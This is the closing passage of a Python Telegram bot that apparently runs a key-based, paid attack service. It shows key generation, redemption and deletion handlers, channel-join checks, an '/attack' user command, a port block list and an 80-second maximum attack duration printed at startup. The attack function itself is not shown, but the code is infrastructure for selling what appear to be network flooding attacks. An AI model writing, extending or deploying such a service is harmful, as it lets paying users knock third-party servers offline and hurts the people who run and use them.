            await query.edit_message_text(
                "❌ *Not joined yet!*\n\nJoin the channel first, then tap verify.",
                parse_mode="Markdown",
                reply_markup=join_keyboard()
            )
        except Exception as e:
            if "not modified" not in str(e).lower():
                logger.error(e)
            else:
                try:
                    await ctx.bot.send_message(uid, "⚠️ Still not joined!", reply_markup=join_keyboard())
                except: pass

async def cb_confirm_delall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "confirm_delall":
        count = db.delete_all_keys()
        await query.edit_message_text(
            f"✅ *All Keys Deleted*\n\n"
            f"🗑️ Removed **{count}** keys from database.\n\n"
            f"ℹ️ User accounts already redeemed with these keys remain ACTIVE.\n"
            f"❌ No new users can redeem the deleted keys.\n\n"
            f"Use `/genkey` to create new keys.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
    else:
        await query.edit_message_text(
            f"❌ *Operation Cancelled*\n\n"
            f"No keys were deleted.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )

async def err_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {ctx.error}")

def main():
    global db
    db = DB()
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Admin commands
    app.add_handler(CommandHandler("genkey",         cmd_genkey))
    app.add_handler(CommandHandler("keys",           cmd_keys))
    app.add_handler(CommandHandler("delkey",         cmd_delkey))
    app.add_handler(CommandHandler("delkeyall",      cmd_delkeyall))
    app.add_handler(CommandHandler("delusedkeys",    cmd_delusedkeys))
    app.add_handler(CommandHandler("delunusedkeys",  cmd_delunusedkeys))
    app.add_handler(CommandHandler("delkeysbyhours", cmd_delkeysbyhours))
    app.add_handler(CommandHandler("users",          cmd_users))
    app.add_handler(CommandHandler("mykeys",         cmd_mykeys))
    app.add_handler(CommandHandler("broadcast",      cmd_broadcast))
    app.add_handler(CommandHandler("stats",          cmd_stats))
    app.add_handler(CommandHandler("curlip",         cmd_curlip))
    app.add_handler(CommandHandler("serverip",       cmd_serverip))
    app.add_handler(CommandHandler("logs",           cmd_logs))
    
    # User commands
    app.add_handler(CommandHandler("start",          cmd_start))
    app.add_handler(CommandHandler("help",           cmd_help))
    app.add_handler(CommandHandler("redeem",         cmd_redeem))
    app.add_handler(CommandHandler("attack",         cmd_attack))
    app.add_handler(CommandHandler("myinfo",         cmd_myinfo))
    app.add_handler(CommandHandler("myredeemed",     cmd_myredeemed))
    app.add_handler(CommandHandler("mystats",        cmd_mystats))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(cb_verify, pattern="^verify_join$"))
    app.add_handler(CallbackQueryHandler(cb_confirm_delall, pattern="^(confirm_delall|cancel_delall)$"))
    
    app.add_error_handler(err_handler)
    
    try:
        server_ip = requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip", "Unknown")
    except:
        server_ip = "Unknown"
    print("=" * 50)
    print("🤖  BOT STARTING")
    print(f"🌐  Server IP  : {server_ip}")
    print(f"👑  Admins     : {ADMIN_IDS}")
    print(f"📢  Channel    : {CHANNEL_ID} ({CHANNEL_USERNAME})")
    print(f"🚫  Blocked    : {sorted(BLOCKED_PORTS)}")
    print("✅  Max Duration: 80 seconds")
    print("✅  Multiple keys per user: ENABLED")
    print("=" * 50)
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()